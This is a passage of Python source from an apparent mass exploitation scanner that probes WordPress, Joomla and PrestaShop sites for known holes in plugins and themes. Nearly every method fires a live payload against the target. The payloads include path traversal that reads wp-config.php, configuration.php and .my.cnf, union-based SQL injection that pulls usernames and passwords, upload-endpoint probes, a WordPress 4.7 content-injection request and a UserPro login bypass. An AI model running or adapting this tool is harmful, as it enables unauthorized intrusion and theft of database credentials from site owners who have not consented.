            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('downloadsmanagr',site)
            else:
                pass
        except:
            pass
    def formcraft(self, site):
        try:
         for i in ['/wp-content/plugins/formcraft/file-upload/server/content/upload.php','/wp-content/plugins/formcraft/file-upload/server/php/']:
            Exp = 'http://' + site +i
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('formcraft',site)
            else:
                pass
        except:
            pass    
    def openflashchart(self, site):
        try:
            Exp = 'http://' + site +'/resources/open-flash-chart/php-ofc-library/ofc_upload_image.php?name=test.php'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('openflashchart',site)
            else:
                pass
        except:
            pass
    def dreamwork(self, site):
        try:
            Exp = 'http://' + site +'/wp-admin/admin.php?page=dreamwork_manage'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('dreamwork',site)
            else:
                pass
        except:
            pass
    def contactform(self, site):
        try:
            Exp = 'http://' + site +'/wp-content/uploads/contact_files/'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('contactform',site)
            else:
                pass
        except:
            pass
    def fluid_forms(self, site):
        try:
            Exp = 'http://' + site +'/wp-content/plugins/fluid_forms/file-upload/server/php/'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('fluid_forms',site)
            else:
                pass
        except:
            pass    
    def levoslideshow(self, site):
        try:
            Exp = 'http://' + site +'/wp-admin/admin.php?page=levoslideshow_manage'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('levoslideshow',site)
            else:
                pass
        except:
            pass
    def vertical(self, site):
        try:
            Exp = 'http://' + site +'/wp-admin/admin.php?page=vertical_manage'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('vertical',site)
            else:
                pass
        except:
            pass
    def carousel(self, site):
        try:
            Exp = 'http://' + site +'/wp-admin/admin.php?page=carousel_manage'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('carousel',site)
            else:
                pass
        except:
            pass
    def superb(self, site):
        try:
            Exp = 'http://' + site +'/wp-admin/admin.php?page=superb_manage'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('superb',site)
            else:
                pass
        except:
            pass   
    def yass(self, site):
        try:
            Exp = 'http://' + site +'/wp-admin/admin.php?page=yass_manage'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('yass',site)
            else:
                pass
        except:
            pass
    def homepageslideshow(self, site):
        try:
            Exp = 'http://' + site +'/wp-admin/admin.php?page=homepageslideshow_manage'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('homepageslideshow',site)
            else:
                pass
        except:
            pass    
    def imagenewsslider(self, site):
        try:
            Exp = 'http://' + site +'/wp-admin/admin.php?page=image-news-slider_manage'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('imagenewsslider',site)
            else:
                pass
        except:
            pass
    def blissnewsslider(self, site):
        try:
            Exp = 'http://' + site +'/wp-admin/admin.php?page=unique_manage'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('blissnewsslider',site)
            else:
                pass
        except:
            pass
    def xdatatoolkit(self, site):
        try:
            Exp = 'http://' + site +'/wp-content/plugins/xdata-toolkit/modules/TransformStudio/SaveTransformUpdateView.php'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('xdatatoolkit',site)
            else:
                pass
        except:
            pass
    def powerzoomer(self, site):
        try:
            Exp = 'http://' + site +'/wp-admin/admin.php?page=powerzoomer_manage'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('powerzoomer',site)
            else:
                pass
        except:
            pass    
    def woocommerceproductsfilter(self, site):
        try:
            Exp = 'http://' + site +'/wp-content/plugins/woocommerce-products-filter/languages/woocommerce-products-filter-en_US.po'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('woocommerceproductsfilter',site)
            else:
                pass
        except:
            pass
    def mmformscommunity(self, site):
        try:
            Exp = 'http://' + site +'/wp-content/plugins/mm-forms-community/includes/doajaxfileupload.php'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('mmformscommunity',site)
            else:
                pass
        except:
            pass
    def developertools(self, site):
        try:
            Exp = 'http://' + site +'/wp-content/plugins/developer-tools/libs/swfupload/upload.php'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('developertools',site)
            else:
                pass
        except:
            pass    
    def genesis_simple(self, site):
        try:
            Exp = 'http://' + site +'/wp-content/plugins/genesis-simple-defaults/uploadFavicon.php'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('genesis_simple',site)
            else:
                pass
        except:
            pass
    def dzs_portfolio(self, site):
        try:
         for i in ['/wp-content/plugins/dzs-portfolio/admin/upload.php','/wp-content/plugins/dzs-portfolio/upload.php']:
            Exp = 'http://' + site +i
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('dzs_portfolio',site)
            else:
                pass
        except:
            pass
    def dzs_videogallery(self, site):
        try:
         for i in ['/wp-content/plugins/dzs-videogallery/admin/upload.php','/wp-content/plugins/dzs-videogallery/upload.php']:
            Exp = 'http://' + site +i
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('dzs_videogallery',site)
            else:
                pass
        except:
            pass
    def RevsliderGetcPanel(self, site):
        try:
            Exp = 'http://' + site +'/wp-admin/admin-ajax.php?action=revslider_show_image&img=../../.my.cnf'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('RevsliderGetcPanel',site)
            else:
                pass
        except:
            pass    
    def showbiz(self, site):
        try:
            Exp = 'http://' + site +'/wp-content/plugins/showbiz/temp/update_extract/'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('showbiz',site)
            else:
                pass
        except:
            pass
    def SimpleAdsManager(self, site):
        try:
            Exp = 'http://' + site +'/wp-content/plugins/simple-ads-manager/sam-ajax-admin.php'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('SimpleAdsManager',site)
            else:
                pass
        except:
            pass
    def slideshowpro(self, site):
        try:
            Exp = 'http://' + site +'/wp-admin/admin.php?page=slideshowpro_manage'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('slideshowpro',site)
            else:
                pass
        except:
            pass
    def wp_mobile_detectorx(self, site):
        try:
            Exp = 'http://' + site +'/wp-content/plugins/wp-mobile-detector/cache/'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('wp_mobile_detector',site)
            else:
                pass
        except:
            pass    
    def InBoundio_Marketing(self, site):
        try:
            Exp = 'http://' + site +'/wp-content/plugins/inboundio-marketing/admin/partials/csv_uploader.php'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('InBoundio_Marketing',site)
            else:
                pass
        except:
            pass
    def dzs_zoomsounds(self, site):
        try:
         for i in ['/wp-content/plugins/dzs-zoomsounds/admin/upload.php','/wp-content/plugins/dzs-zoomsounds/upload.php']:
            Exp = 'http://' + site +i
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('dzs_zoomsounds',site)
            else:
                pass
        except:
            pass
    def Reflex_Gallery(self, site):
        try:
            Exp = 'http://' + site +'/wp-content/plugins/reflex-gallery/admin/scripts/FileUploader/php.php?Year=2018&Month='
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('Reflex_Gallery',site)
            else:
                pass
        except:
            pass
    def Creative_Contact_Form(self, site):
        try:
            Exp = 'http://' + site +'/wp-content/plugins/sexy-contact-form/includes/fileupload/index.php'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('Creative_Contact_Form',site)
            else:
                pass
        except:
            pass
    def Realestate_tema_upload(self, site):
        try:
            Exp = 'http://' + site +'/wp-content/themes/Realestate/Monetize/general/upload-file.php'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('Realestate_tema_upload',site)
            else:
                pass
        except:
            pass
    def Work_The_Flow_File_Upload(self, site):
        try:
            Exp = 'http://' + site +'/wp-content/plugins/work-the-flow-file-upload/public/assets/jQuery-File-Upload-9.5.0/server/php/'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('Work_The_Flow_File_Upload',site)
            else:
                pass
        except:
            pass    
    def brainstorm(self, site):
        try:
            Exp = 'http://' + site +'/wp-content/themes/brainstorm/functions/jwpanel/scripts/uploadify/uploadify.php'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('brainstorm',site)
            else:
                pass
        except:
            pass
    def php_event_calendar(self, site):
        try:
            Exp = 'http://' + site +'/wp-content/plugins/php-event-calendar/server/file-uploader/'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('php_event_calendar',site)
            else:
                pass
        except:
            pass
    def synoptic(self, site):
        try:
            Exp = 'http://' + site +'/wp-content/themes/synoptic/lib/avatarupload/upload.php'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('synoptic',site)
            else:
                pass
        except:
            pass
    def u_design(self, site):
        try:
            Exp = 'http://' + site +'/wp-content/themes/u-design/scripts/admin/uploadify/uploadify.php'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('u_design',site)
            else:
                pass
        except:
            pass    
    def workflow(self, site):
        try:
            Exp = 'http://' + site +'/wp-content/plugins/work-the-flow-file-upload/public/assets/jQuery-File-Upload-9.5.0/server/php/index.php'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('workflow',site)
            else:
                pass
        except:
            pass
    def wp_shop(self, site):
        try:
            Exp = 'http://' + site +'/wp-content/plugins/wpshop/includes/ajax.php?elementCode=ajaxUpload'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('wp_shop',site)
            else:
                pass
        except:
            pass
    def RobotcaLFDcnf(self, site):
        try:
            Exp = 'http://' + site +'/wp-content/plugins/robotcpa/f.php?l=cGhwOi8vZmlsdGVyL3Jlc291cmNlPS4vLi4vLi4vLi4vd3AtY29uZmlnLnBocA=='
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('RobotcaLFDcnf',site)
            else:
                pass
        except:
            pass
    def miwoftpLFDcnf(self, site):
        try:
            Exp = 'http://' + site +'/wp-admin/admin.php?page=miwoftp&option=com_miwoftp&action=download&item=wp-config.php&order=name&srt=yes'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('miwoftpLFDcnf',site)
            else:
                pass
        except:
            pass
    def ebookLFDcnf(self, site):
        try:
            Exp = 'http://' + site +'/wp-content/plugins/aspose-cloud-ebook-generator/aspose_posts_exporter_download.php?file=../../../wp-config.php'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('ebookLFDcnf',site)
            else:
                pass
        except:
            pass
    def yakimabaitcnf(self, site):
        try:
            Exp = 'http://' + site +'/wp-content/themes/yakimabait/download.php?file=./wp-config.php"'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('yakimabaitcnf',site)
            else:
                pass
        except:
            pass    
    def filemanagercnf(self, site):
        try:
            Exp = 'http://' + site +'/wp-content/plugins/wp-filemanager/incl/libfile.php?&path=../../&filename=wp-config.php&action=download'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('filemanagercnf',site)
            else:
                pass
        except:
            pass
    def trinitycnf(self, site):
        try:
            Exp = 'http://' + site +'/wp-content/themes/trinity/lib/scripts/download.php?file=../../../../../wp-config.php'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('trinitycnf',site)
            else:
                pass
        except:
            pass
    def RedSteelcnf(self, site):
        try:
            Exp = 'http://' + site +'/wp-content/themes/RedSteel/download.php?file=../../../wp-config.php'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('RedSteelcnf',site)
            else:
                pass
        except:
            pass
    def paralleluscnf(self, site):
        try:
            Exp = 'http://' + site +'/wp-content/themes/parallelus-salutation/framework/utilities/download/getfile.php?file=..%2F..%2F..%2F..%2F..%2F..%2Fwp-config.php'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('paralleluscnf',site)
            else:
                pass
        except:
            pass    
    def kbslider_show(self, site):
        try:
            Exp = 'http://' + site +'/wp-admin/admin-ajax.php?action=kbslider_show_image&img=../wp-config.php'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('kbslider_show',site)
            else:
                pass
        except:
            pass
    def view_pdfcnf(self, site):
        try:
            Exp = 'http://' + site +'/wp-content/themes/acento/includes/view-pdf.php?download=1&file=/path/wp-config.php'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('view_pdfcnf',site)
            else:
                pass
        except:
            pass
    def advanced_uploader(self, site):
        try:
            Exp = 'http://' + site +'/wp-content/plugins/advanced-uploader/upload.php?destinations=../../../../../../../../../wp-config.php%00'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('advanced_uploader',site)
            else:
                pass
        except:
            pass    
    def urbancitycnf(self, site):
        try:
            Exp = 'http://' + site +'/wp-content/themes/urbancity/lib/scripts/download.php?file=../../../../../wp-config.php'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('urbancitycnf',site)
            else:
                pass
        except:
            pass    
    def mTheme_Unuscnf(self, site):
        try:
            Exp = 'http://' + site +'/wp-content/themes/mTheme-Unus/css/css.php?files=../../../../wp-config.php'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('mTheme-Unuscnf',site)
            else:
                pass
        except:
            pass
    def realty(self, site):
        try:
         for i in ['/modules/realty/evogallery/uploadimage.php','/modules/realty/include/uploadimage.php','/modules/realty/evogallery2/uploadimage.php']:
            Exp = 'http://' + site +i
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('realty',site)
            else:
                pass
        except:
            pass
    def resaleform(self, site):
        try:
            Exp = 'http://' + site +'/modules/resaleform/upload.php'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('resaleform',site)
            else:
                pass
        except:
            pass
    def megaproduct(self, site):
        try:
            Exp = 'http://' + site +'/modules/megaproduct/'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('megaproduct',site)
            else:
                pass
        except:
            pass    
    def additionalproductstabs(self, site):
        try:
            Exp = 'http://' + site +'/modules/additionalproductstabs/file_upload.php'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('additionalproductstabs',site)
            else:
                pass
        except:
            pass    
    def addthisplugin(self, site):
        try:
            Exp = 'http://' + site +'/modules/addthisplugin/file_upload.php'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('addthisplugin',site)
            else:
                pass
        except:
            pass
    def orderfiles(self, site):
        try:
            Exp = 'http://' + site +'/modules/orderfiles/ajax/upload.php'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('orderfiles',site)
            else:
                pass
        except:
            pass
    def pk_vertflexmenu(self, site):
        try:
            Exp = 'http://' + site +'/modules/pk_vertflexmenu/ajax/upload.php'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('pk_vertflexmenu',site)
            else:
                pass
        except:
            pass    
    def masseditproduct(self, site):
        try:
            Exp = 'http://' + site +'/modules/lib/redactor/file_upload.php'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('masseditproduct',site)
            else:
                pass
        except:
            pass    
    def blocktestimonial(self, site):
        try:
            Exp = 'http://' + site +'/modules/blocktestimonial/addtestimonial.php'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('blocktestimonial',site)
            else:
                pass
        except:
            pass
    def lokomedia(self, site):
        try:
         for i in ["/statis--7'union select /*!50000Concat*/(Version())+from+users--+--+kantordesa.html","/statis--7'union select /*!50000Concat*/(Database())+from+users--+--+kantordesa.html","/statis--7'union select /*!50000Concat*/(USER())+from+users--+--+kantordesa.html","/statis--7'union select /*!50000Concat*/(username)+from+users--+--+kantordesa.html","/statis--7'union select /*!50000Concat*/(password)+from+users--+--+kantordesa.html"]:
            Exp = 'http://' + site +i
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('lokomedia',site)
            else:
                pass
        except:
            pass
    def comadsmanager(self, site):
        try:
            Exp = 'http://' + site +'/components/com_oziogallery/imagin/scripts_ralcr/filesystem/writeToFile.php'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('comadsmanager',site)
            else:
                pass
        except:
            pass
    def com_simplephotogallery(self, site):
        try:
            Exp = 'http://' + site +'/administrator/components/com_simplephotogallery/lib/uploadFile.php'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('com_simplephotogallery',site)
            else:
                pass
        except:
            pass    
    def com_media(self, site):
        try:
         for i in ['/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload','/index.php?option=com_media&view=images&tmpl=component&fieldid=&e_name=jform_articletext&asset=com_content&author=&folder=']:
            Exp = 'http://' + site +i
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('com_media',site)
            else:
                pass
        except:
            pass    
    def comfabrik(self, site):
        try:
         for i in ['/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload','/index.php?option=com_fabrik&c=import&view=import&filetype=csv&table=1']:
            Exp = 'http://' + site +i
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('comfabrik',site)
            else:
                pass
        except:
            pass
    def mod_socialpinboard_menu(self, site):
        try:
            Exp = 'http://' + site +'/modules/mod_socialpinboard_menu/saveimagefromupload.php'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('mod_socialpinboard_menu',site)
            else:
                pass
        except:
            pass
    def foxcontact(self, site):
        try:
         for i in ["components/com_foxcontact/lib/file-uploader.php?cid={}&mid={}&qqfile=/../../_func.php",
"index.php?option=com_foxcontact&view=loader&type=uploader&owner=component&id={}?cid={}&mid={}&qqfile=/../../_func.php",
"index.php?option=com_foxcontact&amp;view=loader&amp;type=uploader&amp;owner=module&amp;id={}&cid={}&mid={}&owner=module&id={}&qqfile=/../../_func.php",
"components/com_foxcontact/lib/uploader.php?cid={}&mid={}&qqfile=/../../_func.php",'/kontakty','/kontakty.html','/contatti.html','/index.php/kontakty','/contact','/contacto','/index.php/contato.html','/en/contact','/contactenos']:
            Exp = 'http://' + site +i
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('foxcontact',site)
            else:
                pass
        except:
            pass
    def com_b2jcontact(self, site):
        try:
            Exp = 'http://' + site +'/components/com_b2jcontact/'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('com_b2jcontact',site)
            else:
                pass
        except:
            pass    
    def com_users(self, site):
        try:
            Exp = 'http://' + site +'/index.php?option=com_users&view=registration'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('com_users',site)
            else:
                pass
        except:
            pass
    def com_weblinks(self, site):
        try:
            Exp = 'http://' + site +'/index.php?option=com_media&view=images&tmpl=component&e_name=jform_description&asset=com_weblinks&author='
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('com_weblinks',site)
            else:
                pass
        except:
            pass
    def mod_simplefileupload(self, site):
        try:
            Exp = 'http://' + site +'/modules/mod_simplefileuploadv1.3/elements/udd.php'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('mod_simplefileupload',site)
            else:
                pass
        except:
            pass
    def com_redmystic(self, site):
        try:
            Exp = 'http://' + site +'/administrator/components/com_redmystic/chart/ofc-library/ofc_upload_image.php?name=ff.php'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('com_redmystic',site)
            else:
                pass
        except:
            pass    
    def com_civicrm(self, site):
        try:
            Exp = 'http://' + site +'/administrator/components/com_civicrm/civicrm/packages/OpenFlashChart/php-ofc-library/ofc_upload_image.php?name=ff.php'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('com_civicrm',site)
            else:
                pass
        except:
            pass
    def com_acymailing(self, site):
        try:
            Exp = 'http://' + site +'/administrator/components/com_acymailing/inc/openflash/php-ofc-library/ofc_upload_image.php?name=ff.php'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('com_acymailing',site)
            else:
                pass
        except:
            pass
    def com_jnewsletter(self, site):
        try:
            Exp = 'http://' + site +'/administrator/components/com_jnewsletter/includes/openflashchart/php-ofc-library/ofc_upload_image.php?name=ff.php'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('com_jnewsletter',site)
            else:
                pass
        except:
            pass
    def com_jinc(self, site):
        try:
            Exp = 'http://' + site +'/administrator/components/com_jinc/classes/graphics/php-ofc-library/ofc_upload_image.php?name=ff.php'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('com_jinc',site)
            else:
                pass
        except:
            pass
    def com_maianmedia(self, site):
        try:
            Exp = 'http://' + site +'/administrator/components/com_maianmedia/utilities/charts/php-ofc-library/ofc_upload_image.php?name=ff.php'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('com_maianmedia',site)
            else:
                pass
        except:
            pass
    def com_jnews(self, site):
        try:
            Exp = 'http://' + site +'/administrator/components/com_jnews/includes/openflashchart/php-ofc-library/ofc_upload_image.php?name=ff.php'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('com_jnews',site)
            else:
                pass
        except:
            pass    
    def com_joomleague(self, site):
        try:
            Exp = 'http://' + site +'/components/com_joomleague/assets/classes/open-flash-chart/ofc_upload_image.php?name=ff.php'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('com_joomleague',site)
            else:
                pass
        except:
            pass

    def com_spidersql(self, site):
        try:
            Exp = 'http://' + site +"/index.php?option=com_spidercalendar&date=999999.9'union all select null%2Cnull%2Cconcat(0x3c757365723e,username,0x3c757365723e3c706173733e,password,0x3c706173733e)%2Cnull%2Cnull%2Cnull from jos_users"
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('com_spidersql',site)
            else:
                pass
        except:
            pass    
    def mod_dvfoldercontentcnf(self, site):
        try:
            Exp = 'http://' + site +'/modules/mod_dvfoldercontent/download.php?f=Li4vLi4vY29uZmlndXJhdGlvbi5waHA='
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('mod_dvfoldercontentcnf',site)
            else:
                pass
        except:
            pass
    def jw_allvideoscnf(self, site):
        try:
            Exp = 'http://' + site +'/plugins/content/jw_allvideos/includes/download.php?file=../../../../configuration.php'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('jw_allvideoscnf',site)
            else:
                pass
        except:
            pass
    def com_product_modulcnf(self, site):
        try:
            Exp = 'http://' + site +'/index.php?option=com_product_modul&task=download&file=../../../../../configuration.php&id=1&Itemid=1'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('com_product_modulcnf',site)
            else:
                pass
        except:
            pass
    def com_cckjseblodcnf(self, site):
        try:
            Exp = 'http://' + site +'/index.php?option=com_cckjseblod&task=download&file=configuration.php'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('com_cckjseblodcnf',site)
            else:
                pass
        except:
            pass
    def com_contushdvideosharecnf(self, site):
        try:
            Exp = 'http://' + site +'/components/com_contushdvideoshare/hdflvplayer/download.php?f=../../../configuration.php'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('com_contushdvideosharecnf',site)
            else:
                pass
        except:
            pass
    def com_communitycnf(self, site):
        try:
            Exp = 'http://' + site +'/index.php?option=com_community&view=groups&groupid=1&task=app&app=groupfilesharing&do=download&file=../../../../configuration.php&Itemid=0'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('com_communitycnf',site)
            else:
                pass
        except:
            pass    
    def com_aceftpcnf(self, site):
        try:
            Exp = 'http://' + site +'/administrator/components/com_aceftp/quixplorer/index.php?action=download&dir=&item=configuration.php&order=name&srt=yes'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('com_aceftpcnf',site)
            else:
                pass
        except:
            pass
    def wddownloadcnf(self, site):
        try:
            Exp = 'http://' + site +'/plugins/content/wd/wddownload.php?download=wddownload.php&file=../../../configuration.php'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('wddownloadcnf',site)
            else:
                pass
        except:
            pass
    '''def (self, site):
        try:
            Exp = 'http://' + site +
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('',site)
            else:
                pass
        except:
            pass'''
        
    def Com_Joomanagerx(self, site):
        try:
            Exp = 'http://' + site + \
                  '/index.php?option=com_joomanager&controller=details&task=download&path=configuration.php'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('Com_Joomanager',site)
            else:
                pass
        except:
            pass
    def Com_Macgalleryx(self, site):
        try:
            Exp = 'http://' + site + '/index.php?option=com_macgallery&view=download&albumid=../../configuration.php'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('Com_Macgallery',site)
            else:
                pass
        except:
            pass

    def Com_CCkJseblodx(self, site):
        try:
            Exp = 'http://' + site + '/index.php?option=com_cckjseblod&task=download&file=configuration.php'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('Com_CCkJseblod',site)
            else:
                pass
        except:
            pass

    def Com_MyBlogx(self, site):
        try:
            Exp = 'http://' + site + '/index.php?option=com_myblog&task=ajaxupload'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('Com_MyBlog',site)
            else:
                pass
        except:
            pass
  
    def Com_Jdownloadsx(self, site):
        try:
            Exp = 'http://' + site + '/index.php?option=com_jdownloads&Itemid=0&view=upload'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('Com_Jdownloads',site)
            else:
                pass
        except:
            pass

    def Com_Fabricx(self, site):
        try:
            Exp = 'http://' + site + "/index.php?option=com_fabrik&c=import&view=import&filetype=csv&table="
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('Com_Fabric',site)
            else:
                pass
        except:
            pass

    def Com_AdsManager(self, site):
        try:
            Exp = requests.get('http://' + site + "/index.php?option=com_adsmanager&task=upload&tmpl=component", timeout=5)
            if Exp.status_code == 200:
                self.printor('Com_AdsManager',site)
            else:
                pass
        except:
            pass

    def Com_AdsManager_Shellx(self, site):
        try:
            Exp = requests.get('http://' + site + "/index.php?option=com_adsmanager&task=upload&tmpl=component", timeout=5)
            if Exp.status_code == 200:
                self.printor('Com_AdsManager_Shell',site)
            else:
                pass
        except:
            pass

    def Jce_Testx(self, site):
        try:
         for i in ['/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20','/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form']:
            Exp = requests.get('http://' + site +i, timeout=5)
            if Exp.status_code == 200:
                self.printor('Com_JCE',site)
            else:
                pass
        except:
            pass


    def Check(self, site):
        try:
            Exp = 'http://' + site + '/administrator/components/com_alberghi/upload.alberghi.php'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('Check',site)
            else:
                pass
        except:
            pass

    def CateGory_page_iconsx(self, site):
        try:
            ChckVln = requests.get('http://' + site + '/wp-content/plugins/category-page-icons/css/menu.css', timeout=5)
            if ChckVln.status_code == 200:
                self.printor('CateGory_page_icons',site)
            else:
                pass
        except:
            pass


    def Downloads_Managerx(self, site):
        try:
            Checkvuln = requests.get('http://' + site + '/wp-content/plugins/downloads-manager/img/unlock.gif', timeout=5)
            if 'D9ABB614B8D911E3AB27A52B5ED2F278' in Checkvuln.text.encode('utf-8'):
                self.printor('Downloads_Manager',site)
            else:
                pass
        except:
            pass

    def wp_content_injectionx(self, site):
        try:
            GoT = requests.post('http://' + site + '/wp-json/wp/v2/posts/' + str(zaq), data=data, headers=headers, timeout=10)
            if GoT.statut_code==200:
                self.printor('Wordpress-4.7-Content-Injection',site)
            else:
                pass
        except:
            pass

    def Wp_Job_Managerx(self, site):
        try:
         for i in ['/jm-ajax/upload_file/','//wp-content/uploads/job-manager-uploads/file/']:
            Exploit = i
            CheckVuln = requests.get('http://' + site + Exploit, timeout=5)
            if '"files":[]' in CheckVuln.text.encode('utf-8'):
                self.printor('Wp-Job-Manager',site)
            else:
                pass
        except:
            pass



    def UserProExploitx(self, site):
        try:
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:36.0) Gecko/20100101 Firefox/36.0',
                       'Accept': '*/*'}
            exploit = '/?up_auto_log=true'
            sess = requests.session()
            admin_re_page = 'http://' + site + '/wp-admin/'
            sess.get('http://' + site + exploit, timeout=10, headers=headers)
            Check_login = sess.get(admin_re_page, timeout=10, headers=headers)
            if '<li id="wp-admin-bar-logout">' in Check_login.text:
                self.printor('UserProExploit',site)
            else:
                pass
        except:
            pass


    def formcraftExploit_Shellx(self, site):
        try:
